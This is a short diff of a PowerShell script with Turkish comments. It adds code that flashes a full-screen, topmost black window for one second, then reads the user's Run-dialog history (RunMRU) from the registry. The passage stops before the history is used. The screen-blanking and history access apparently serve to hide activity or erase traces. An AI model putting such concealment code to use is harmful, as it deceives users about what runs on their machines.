@@ -1,4 +1,9 @@
 $code = @'
+# 1 saniyelik siyah ekran
+$null=Add-Type -A System.Windows.Forms,System.Drawing
+$f=[Windows.Forms.Form]::new();$f.FormBorderStyle=0;$f.WindowState=2;$f.BackColor=[Drawing.Color]::Black;$f.TopMost=1;$f.ShowInTaskbar=0;$f.add_Shown({sleep 1;$f.Close()});[Windows.Forms.Application]::Run($f)
+
+# Ana kod
 $registryPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 if(Test-Path $registryPath){
     $values=Get-ItemProperty -Path $registryPath
